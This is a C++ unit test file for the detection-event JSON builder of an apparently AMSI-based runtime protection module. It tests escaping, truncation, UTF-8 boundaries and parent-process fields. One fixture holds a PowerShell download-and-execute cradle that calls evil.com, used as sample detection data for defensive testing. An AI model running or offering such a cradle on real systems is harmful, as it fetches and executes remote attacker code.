#include "event_submit_client.h"

#include <iostream>
#include <map>
#include <string>

namespace {

bool Expect(bool condition, const char* message)
{
    if (!condition)
        std::cerr << "FAIL: " << message << "\n";
    return condition;
}

EventJsonBuildInput BaseInput()
{
    EventJsonBuildInput input;
    input.eventId = "evt-fixed";
    input.timestamp = "2026-04-30T01:02:03.004Z";
    input.moduleName = "rasp_mod_amsi";
    input.ruleId = "rule-1";
    input.sensor = "AmsiProvider";
    input.block = true;
    input.severity = "Critical";
    input.description = "quote \" slash \\ newline\n tab\t";
    input.appName = "powershell.exe";
    input.contentName = "C:\\scripts\\demo.ps1";
    input.confidence = 91;
    input.ip = "127.0.0.1";
    input.ua = "unit-test";
    input.payload = "IEX \"payload\"\n中文";
    return input;
}

bool ParseFlatJsonObject(const std::string& json, std::map<std::string, std::string>& out)
{
    out.clear();
    size_t i = 0;
    auto skipWs = [&]() {
        while (i < json.size() && (json[i] == ' ' || json[i] == '\t' || json[i] == '\r' || json[i] == '\n'))
            ++i;
    };
    auto readString = [&](std::string& s) {
        skipWs();
        if (i >= json.size() || json[i] != '"')
            return false;
        ++i;
        s.clear();
        while (i < json.size() && json[i] != '"') {
            if (json[i] == '\\') {
                ++i;
                if (i >= json.size())
                    return false;
                switch (json[i]) {
                case '"': s.push_back('"'); break;
                case '\\': s.push_back('\\'); break;
                case 'n': s.push_back('\n'); break;
                case 'r': s.push_back('\r'); break;
                case 't': s.push_back('\t'); break;
                default: s.push_back(json[i]); break;
                }
                ++i;
            } else {
                s.push_back(json[i++]);
            }
        }
        if (i >= json.size() || json[i] != '"')
            return false;
        ++i;
        return true;
    };

    skipWs();
    if (i >= json.size() || json[i++] != '{')
        return false;
    skipWs();
    while (i < json.size() && json[i] != '}') {
        std::string key;
        std::string value;
        if (!readString(key))
            return false;
        skipWs();
        if (i >= json.size() || json[i++] != ':')
            return false;
        if (!readString(value))
            return false;
        out[key] = value;
        skipWs();
        if (i < json.size() && json[i] == ',') {
            ++i;
            skipWs();
        }
    }
    return i < json.size() && json[i] == '}';
}

} // namespace

int main()
{
    {
        EventJsonBuilder builder;
        EventJsonBuildInput input = BaseInput();
        EventJsonBuildResult result = builder.BuildDetection(input);

        const std::string expected =
            "{\"id\":\"evt-fixed\","
            "\"ts\":\"2026-04-30T01:02:03.004Z\","
            "\"sev\":\"Critical\","
            "\"act\":\"block\","
            "\"cat\":\"Detection\","
            "\"mod\":\"rasp_mod_amsi\","
            "\"sensor\":\"AmsiProvider\","
            "\"rule\":\"rule-1\","
            "\"desc\":\"quote \\\" slash \\\\ newline\\n tab\\t\","
            "\"appName\":\"powershell.exe\","
            "\"contentName\":\"C:\\\\scripts\\\\demo.ps1\","
            "\"confidence\":\"91\","
            "\"ip\":\"127.0.0.1\","
            "\"ua\":\"unit-test\","
            "\"pattern\":\"IEX \\\"payload\\\"\\n中文\","
            "\"parentPid\":\"0\","
            "\"parentProcessName\":\"\","
            "\"parentProcessPath\":\"\"}";

        if (!Expect(result.compactJson == expected, "raw JSON matches legacy field order and escaping"))
            return 1;
        if (!Expect(result.decision == "block", "block decision maps to legacy act"))
            return 1;
        if (!Expect(!result.eventTruncated, "short payload is not marked truncated"))
            return 1;

        std::map<std::string, std::string> fields;
        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "canonical JSON parses"))
            return 1;
        if (!Expect(fields["id"] == input.eventId, "canonical id matches"))
            return 1;
        if (!Expect(fields["sev"] == input.severity, "canonical severity matches"))
            return 1;
        if (!Expect(fields["pattern"] == input.payload, "canonical payload matches"))
            return 1;
    }

    {
        EventJsonBuilder builder;
        EventJsonBuildInput input = BaseInput();
        input.block = false;
        input.severity.clear();
        input.confidence = 0;
        input.payload.clear();
        EventJsonBuildResult result = builder.BuildDetection(input);

        std::map<std::string, std::string> fields;
        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "default JSON parses"))
            return 1;
        if (!Expect(fields["act"] == "audit", "non-block decision maps to audit"))
            return 1;
        if (!Expect(fields["sev"] == "High", "empty severity preserves legacy High fallback"))
            return 1;
        if (!Expect(fields["confidence"] == "70", "zero confidence preserves legacy fallback"))
            return 1;
        if (!Expect(fields["pattern"].empty(), "empty payload preserves legacy empty pattern"))
            return 1;
    }

    {
        EventJsonBuilder builder;
        EventJsonBuildInput input = BaseInput();
        input.description.assign(10 * 1024, 'D');
        input.payload = std::string("control-") + static_cast<char>(0x01);
        EventJsonBuildResult result = builder.BuildDetection(input);

        std::map<std::string, std::string> fields;
        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "control character JSON parses"))
            return 1;
        if (!Expect(fields["desc"].size() == 10 * 1024, "description is not truncated by legacy builder"))
            return 1;
        if (!Expect(result.compactJson.find("\\u0001") != std::string::npos,
                    "control characters preserve legacy unicode escape"))
            return 1;
    }

    {
        EventJsonBuilder builder;
        EventJsonBuildInput input = BaseInput();
        input.payload.assign(9 * 1024, 'A');
        EventJsonBuildResult result = builder.BuildDetection(input);

        std::map<std::string, std::string> fields;
        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "truncated JSON parses"))
            return 1;
        if (!Expect(result.eventTruncated, "oversized payload is marked truncated"))
            return 1;
        if (!Expect(fields["pattern"].size() == 8 * 1024, "payload field is capped at legacy 8KB"))
            return 1;
        if (!Expect(fields["pattern"].find("...[Truncated]") != std::string::npos,
                    "payload truncation suffix is present"))
            return 1;
    }

    {
        EventJsonBuilder builder;
        EventJsonBuildInput input = BaseInput();
        std::string prefix(8 * 1024 - std::string("...[Truncated]").size() - 1, 'A');
        input.payload = prefix + "\xF0\x9F\x98\x80" + std::string(128, 'Z');
        EventJsonBuildResult result = builder.BuildDetection(input);

        std::map<std::string, std::string> fields;
        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "emoji boundary JSON parses"))
            return 1;
        if (!Expect(fields["pattern"].size() == 8 * 1024 - 1,
                    "emoji crossing boundary is removed before truncation suffix"))
            return 1;
        if (!Expect(fields["pattern"].find("\xF0\x9F\x98\x80") == std::string::npos,
                    "truncated payload does not contain partial emoji"))
            return 1;
    }

    {
        EventJsonBuilder builder;
        EventJsonBuildInput input = BaseInput();
        std::string prefix(8 * 1024 - std::string("...[Truncated]").size() - 2, 'A');
        input.payload = prefix + "\xE4\xB8\xAD" + std::string(128, 'Z');
        EventJsonBuildResult result = builder.BuildDetection(input);

        std::map<std::string, std::string> fields;
        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "Chinese boundary JSON parses"))
            return 1;
        if (!Expect(fields["pattern"].size() == 8 * 1024 - 2,
                    "Chinese character crossing boundary is removed before truncation suffix"))
            return 1;
        if (!Expect(fields["pattern"].find("\xE4\xB8\xAD") == std::string::npos,
                    "truncated payload does not contain partial Chinese character"))
            return 1;
    }

    // Batch 3: parentPid = 1234
    {
        EventJsonBuilder builder;
        EventJsonBuildInput input = BaseInput();
        input.parentPid = 1234;
        input.parentProcessName = "cmd.exe";
        input.parentProcessPath = "C:\\Windows\\System32\\cmd.exe";
        EventJsonBuildResult result = builder.BuildDetection(input);

        std::map<std::string, std::string> fields;
        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "parent JSON parses"))
            return 1;
        if (!Expect(fields["parentPid"] == "1234", "parentPid output as string"))
            return 1;
        if (!Expect(fields["parentProcessName"] == "cmd.exe", "parentProcessName output"))
            return 1;
        if (!Expect(fields["parentProcessPath"] == "C:\\Windows\\System32\\cmd.exe",
                    "parentProcessPath output"))
            return 1;
    }

    // Batch 3: parentPid = 0 (empty)
    {
        EventJsonBuilder builder;
        EventJsonBuildInput input = BaseInput();
        input.parentPid = 0;
        input.parentProcessName.clear();
        input.parentProcessPath.clear();
        EventJsonBuildResult result = builder.BuildDetection(input);

        std::map<std::string, std::string> fields;
        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "empty parent JSON parses"))
            return 1;
        if (!Expect(fields["parentPid"] == "0", "parentPid is 0 when empty"))
            return 1;
        if (!Expect(fields["parentProcessName"].empty(), "parentProcessName empty when not captured"))
            return 1;
        if (!Expect(fields["parentProcessPath"].empty(), "parentProcessPath empty when not captured"))
            return 1;
    }

    // Batch 3: parentPid = 4 (System sentinel)
    {
        EventJsonBuilder builder;
        EventJsonBuildInput input = BaseInput();
        input.parentPid = 4;
        input.parentProcessName = "System";
        input.parentProcessPath.clear();
        EventJsonBuildResult result = builder.BuildDetection(input);

        std::map<std::string, std::string> fields;
        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "System parent JSON parses"))
            return 1;
        if (!Expect(fields["parentPid"] == "4", "System parentPid is 4"))
            return 1;
        if (!Expect(fields["parentProcessName"] == "System", "System parent name is stable sentinel"))
            return 1;
    }

    // Batch 3: special characters in parentProcessName
    {
        EventJsonBuilder builder;
        EventJsonBuildInput input = BaseInput();
        input.parentProcessName = "process with spaces & special chars \"test\"";
        input.parentProcessPath = "C:\\Program Files\\Parent \"Launcher\"\\parent.exe";
        EventJsonBuildResult result = builder.BuildDetection(input);

        std::map<std::string, std::string> fields;
        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "special chars JSON parses"))
            return 1;
        if (!Expect(fields["parentProcessName"] == "process with spaces & special chars \"test\"",
                    "parentProcessName preserves special chars after escape roundtrip"))
            return 1;
        if (!Expect(fields["parentProcessPath"] == "C:\\Program Files\\Parent \"Launcher\"\\parent.exe",
                    "parentProcessPath preserves special chars after escape roundtrip"))
            return 1;
    }

    // Batch 4a: 完整事件 JSON golden fixture - 成功采集场景
    {
        EventJsonBuilder builder;
        EventJsonBuildInput input;
        input.eventId = "evt-001";
        input.timestamp = "2026-05-09T12:00:00.000Z";
        input.moduleName = "rasp_mod_amsi";
        input.ruleId = "rule-malicious-script";
        input.sensor = "AmsiProvider";
        input.block = true;
        input.severity = "Critical";
        input.description = "检测到恶意脚本执行";
        input.appName = "powershell.exe";
        input.contentName = "C:\\Users\\test\\malicious.ps1";
        input.confidence = 95;
        input.ip = "192.168.1.100";
        input.ua = "WindowsTerminal/1.0";
        input.payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')";
        input.parentPid = 5678;
        input.parentProcessName = "cmd.exe";
        input.parentProcessPath = "C:\\Windows\\System32\\cmd.exe";

        EventJsonBuildResult result = builder.BuildDetection(input);

        std::map<std::string, std::string> fields;
        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "完整事件 JSON 解析成功"))
            return 1;

        // 验证核心字段
        if (!Expect(fields["id"] == "evt-001", "eventId 正确")) return 1;
        if (!Expect(fields["ts"] == "2026-05-09T12:00:00.000Z", "timestamp 正确")) return 1;
        if (!Expect(fields["sev"] == "Critical", "severity 正确")) return 1;
        if (!Expect(fields["act"] == "block", "action=block 正确")) return 1;
        if (!Expect(fields["cat"] == "Detection", "category=Detection 正确")) return 1;
        if (!Expect(fields["mod"] == "rasp_mod_amsi", "moduleName 正确")) return 1;
        if (!Expect(fields["sensor"] == "AmsiProvider", "sensor 正确")) return 1;
        if (!Expect(fields["rule"] == "rule-malicious-script", "ruleId 正确")) return 1;
        if (!Expect(fields["desc"] == "检测到恶意脚本执行", "description 正确")) return 1;
        if (!Expect(fields["appName"] == "powershell.exe", "appName 正确")) return 1;
        if (!Expect(fields["contentName"] == "C:\\Users\\test\\malicious.ps1", "contentName 正确")) return 1;
        if (!Expect(fields["confidence"] == "95", "confidence 正确")) return 1;
        if (!Expect(fields["ip"] == "192.168.1.100", "ip 正确")) return 1;
        if (!Expect(fields["ua"] == "WindowsTerminal/1.0", "ua 正确")) return 1;

        // 验证 payload 和 parent 字段
        if (!Expect(fields["pattern"] == input.payload, "payload/pattern 正确")) return 1;
        if (!Expect(fields["parentPid"] == "5678", "parentPid 正确")) return 1;
        if (!Expect(fields["parentProcessName"] == "cmd.exe", "parentProcessName 正确")) return 1;

        // 验证决策字段
        if (!Expect(result.decision == "block", "decision=block 正确")) return 1;
        if (!Expect(!result.eventTruncated, "payload 未截断")) return 1;
    }

    // Batch 4a: 完整事件 JSON golden fixture - audit 模式 + 空 parent
    {
        EventJsonBuilder builder;
        EventJsonBuildInput input;
        input.eventId = "evt-002";
        input.timestamp = "2026-05-09T12:01:00.000Z";
        input.moduleName = "rasp_mod_amsi";
        input.ruleId = "rule-audit-only";
        input.sensor = "AmsiProvider";
        input.block = false;  // audit 模式
        input.severity = "Medium";
        input.description = "可疑脚本行为（仅审计）";
        input.appName = "powershell.exe";
        input.contentName = "C:\\Users\\test\\suspicious.ps1";
        input.confidence = 50;
        input.ip = "";
        input.ua = "";
        input.payload = "Get-Process | Where-Object {$_.CPU -gt 100}";
        input.parentPid = 0;  // 空 parent
        input.parentProcessName = "";
        input.parentProcessPath = "";

        EventJsonBuildResult result = builder.BuildDetection(input);

        std::map<std::string, std::string> fields;
        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "audit + 空 parent JSON 解析成功"))
            return 1;

        // 验证 audit 决策
        if (!Expect(fields["act"] == "audit", "action=audit 正确")) return 1;
        if (!Expect(result.decision == "audit", "decision=audit 正确")) return 1;

        // 验证空 parent 字段
        if (!Expect(fields["parentPid"] == "0", "空 parentPid=0 正确")) return 1;
        if (!Expect(fields["parentProcessName"] == "", "空 parentProcessName 正确")) return 1;

        // 验证空 ip/ua 字段
        if (!Expect(fields["ip"] == "", "空 ip 正确")) return 1;
        if (!Expect(fields["ua"] == "", "空 ua 正确")) return 1;
    }

    // Batch 4c: parent 字段 + payload 截断组合
    {
        EventJsonBuilder builder;
        EventJsonBuildInput input = BaseInput();
        input.payload.assign(10 * 1024, 'X');  // 超过 8KB 截断阈值
        input.parentPid = 12345;
        input.parentProcessName = "truncated_parent.exe";
        input.parentProcessPath = "C:\\Windows\\System32\\truncated_parent.exe";

        EventJsonBuildResult result = builder.BuildDetection(input);

        std::map<std::string, std::string> fields;
        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "截断 + parent JSON 解析成功"))
            return 1;

        // 验证 payload 截断
        if (!Expect(result.eventTruncated, "payload 标记为截断")) return 1;
        if (!Expect(fields["pattern"].size() == 8 * 1024, "payload 截断到 8KB")) return 1;

        // 验证 parent 字段仍然完整输出（不受截断影响）
        if (!Expect(fields["parentPid"] == "12345", "截断后 parentPid 正确")) return 1;
        if (!Expect(fields["parentProcessName"] == "truncated_parent.exe", "截断后 parentProcessName 正确")) return 1;
    }

    // Batch 4c: parent 字段 + payload 特殊字符组合
    {
        EventJsonBuilder builder;
        EventJsonBuildInput input;
        input.eventId = "evt-special";
        input.timestamp = "2026-05-09T12:02:00.000Z";
        input.moduleName = "rasp_mod_amsi";
        input.ruleId = "rule-special-chars";
        input.sensor = "AmsiProvider";
        input.block = true;
        input.severity = "High";
        input.description = "quote \" slash \\ newline\n";
        input.appName = "powershell.exe";
        input.contentName = "C:\\path\\with\\spaces\\\"test\".ps1";
        input.confidence = 70;
        input.payload = "IEX \"nested \\\"quotes\\\" and \\backslash\"";
        input.parentPid = 999;
        input.parentProcessName = "parent with \"quotes\" & \\backslash\\";
        input.parentProcessPath = "C:\\Parent \"quoted\"\\with\\backslash.exe";

        EventJsonBuildResult result = builder.BuildDetection(input);

        std::map<std::string, std::string> fields;
        if (!Expect(ParseFlatJsonObject(result.compactJson, fields), "特殊字符组合 JSON 解析成功"))
            return 1;

        // 验证特殊字符在 JSON 往返后保持原样
        if (!Expect(fields["desc"] == "quote \" slash \\ newline\n", "description 特殊字符往返正确")) return 1;
        if (!Expect(fields["pattern"] == "IEX \"nested \\\"quotes\\\" and \\backslash\"", "payload 特殊字符往返正确")) return 1;
        if (!Expect(fields["parentProcessName"] == "parent with \"quotes\" & \\backslash\\", "parentProcessName 特殊字符往返正确")) return 1;
    }

    return 0;
}
